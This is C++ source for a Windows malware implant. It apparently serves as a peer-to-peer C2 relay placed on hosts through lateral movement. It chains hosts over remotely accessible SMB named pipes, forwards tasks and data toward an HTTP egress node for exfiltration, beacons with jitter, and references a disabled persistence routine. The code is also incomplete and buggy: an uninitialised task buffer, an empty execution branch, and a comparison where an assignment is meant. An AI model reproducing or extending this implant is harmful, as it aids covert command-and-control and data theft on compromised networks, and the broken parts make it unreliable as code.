/**************************************
 * This exe is placed on machines in
 * an infected network through lateral
 * movement. These nodes will communicate
 * with each other via SMB and data
 * will escape the network through
 * the http egress node
 * ***********************************/


#include <tchar.h>
#include <windows.h>
#include <stdio.h>
#include <string>

#include "include/json_struct.h"
#include "include/persist.h"
#include "include/investigate.h"

struct TasksResponse{
    std::string Path;
    std::string Tasks;

    JS_OBJ(Path, Tasks);
};

int _tmain(int argc, _TCHAR *argv[]){
    //PersistMe();

    // Create server instance
    HANDLE hServer = CreateNamedPipeW(
        L"\\\\.\\pipe\\diplomat",
        (PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE),
        (PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_ACCEPT_REMOTE_CLIENTS),
        1,
        2048,
        2048,
        0,
        NULL
    );
    if(hServer == INVALID_HANDLE_VALUE){
        printf("server creation failure\n");
    }else{
        printf("server created successfully\n");
    }

    // Periodically check for new commands from C2
    while(1){
        // the start of this section should only be happening on the egress node
        char* tasks;

        JS::ParseContext context((char*)tasks);
        TasksResponse tr;
        if (context.parseTo(tr) != JS::Error::NoError)
        {
            std::string errorStr = context.makeErrorString();
            fprintf(stderr, "Error parsing struct %s\n", errorStr.c_str());
            return -1;
        }

        printf("Path: %s\n", tr.Path.c_str());
        printf("Tasks: %s\n", tr.Tasks.c_str());

        std::string hostname = ComputerName();
        if(tr.Path.compare(hostname) == 0){
            // THIS IS THE DESTINATION, execute tasks

        }else{
            // Remove current hostname from path
            int index = tr.Path.find(',');
            tr.Path = tr.Path.substr(index+1);
            // Get name of next host in path
            index = tr.Path.find(',');
            std::string nextHostname;
            if(index == -1){
                nextHostname == tr.Path;
            }else{
                nextHostname = tr.Path.substr(0, index);
            }
            std::string filePath = "\\\\" + nextHostname + "\\pipe\\diplomat";
            printf("%s\n", filePath);

            // OK WE GO NEXT
            HANDLE hNextImplant = CreateFileA(
                filePath.c_str(),
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_WRITE,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );

            // ANYTHING IN HERE??
            DWORD bytesRead;
            void* buffer = malloc(1024);
            ReadFile(
                hNextImplant,
                buffer,
                1023,
                &bytesRead,
                NULL
            );

            if(bytesRead != 0){
                // contained data
                // stick it in my own pipe
                DWORD bytesWritten;
                WriteFile(
                    hServer,
                    buffer,
                    bytesRead,
                    &bytesWritten,
                    NULL
                );
            }

            // HERE, HAVE MY STRING
            std::string json = JS::serializeStruct(tr);
            DWORD bytesWritten;
            WriteFile(
                hNextImplant,
                json.c_str(),
                json.size(),
                &bytesWritten,
                NULL
            );
            
            CloseHandle(hNextImplant);
            free(buffer);
        }

        int jitter = (rand() % 20000) - 10000;
        Sleep(30000+jitter);
    }

}